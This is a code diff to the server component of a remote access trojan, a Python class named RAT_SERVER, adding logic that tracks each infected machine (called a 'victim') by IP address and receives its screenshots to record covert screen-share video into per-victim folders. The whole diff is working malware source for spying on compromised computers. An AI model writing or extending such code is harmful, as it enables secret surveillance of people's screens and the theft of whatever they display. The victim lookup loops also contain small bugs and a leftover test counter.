@@ -58,6 +58,14 @@ class RAT_SERVER(metaclass=SingletonMeta):
                 item[1] = item[1].replace("colon", ":")
                 output_dict[item[0]] = item[1]
 
+            output_dict["socket_ip"] = addr[0]
+
+            # Generate a new filepath for the video
+            randomUUID = str(uuid.uuid4().hex)
+            directory = f"data/{output_dict['Name']}/screenshare/{randomUUID}/"
+
+            output_dict["SCREENSHARE_SOURCE"] = f"{directory}video.avi"
+
             print(
                 f"[*] Adding {output_dict['Name']} to the list of victims")
 
@@ -137,6 +145,16 @@ class RAT_SERVER(metaclass=SingletonMeta):
             print(
                 f"\n[*] Connection is established successfully with {addr[0]}")
 
+            # Use the screenshare_clients list to get the index of the client
+            # Then use that index to get the victim
+            # Then use the victim to get the name
+
+            # Get the victim
+            victim = None
+            for victim in self.victims:
+                if victim["socket_ip"] == addr[0]:
+                    break
+
             print("[*] Starting new thread to handle screenshare client\n")
             # Start a new thread to handle the client
             t = threading.Thread(
@@ -151,26 +169,29 @@ class RAT_SERVER(metaclass=SingletonMeta):
         print("[*] Handling screenshare client" + str(screenshare_socket))
 
         # Make the directory if it doesn't exist
+        # Find the victim using the screenshare_socket
+        victim = None
+        for victim in self.victims:
+            if victim["socket_ip"] == screenshare_socket.getpeername()[0]:
+                break
+
         # directory should be data/<client_name>/screenshare/<date>
-        directory = f"data/{screenshare_socket.getpeername()[0]}/screenshare/"
+        directory = victim['SCREENSHARE_SOURCE'].replace("video.avi", "")
         if not os.path.exists(directory):
             os.makedirs(directory)
 
-        if not os.path.exists(directory):
-            # Create the directory only if it doesn't already exist
-            os.makedirs(directory)
-
-        # Now since we have a client connection already, we will have to listen for images, then
-        # use them to make a video
-        # DO not store the images, just make the video
-
-        # Make the video
         frames = []
-        out = None  # Initialize the VideoWriter outside the loop
+        count = 0  # For testing mesoures
+        out = None
         while True:
             try:
+                if (count == 10000):
+                    break
+                count += 1
                 # Get the image
                 img = self.get_screenshot(screenshare_socket)
+
+                
 
                 # Turn the image into a frame
                 frame = np.array(Image.open(io.BytesIO(img)))
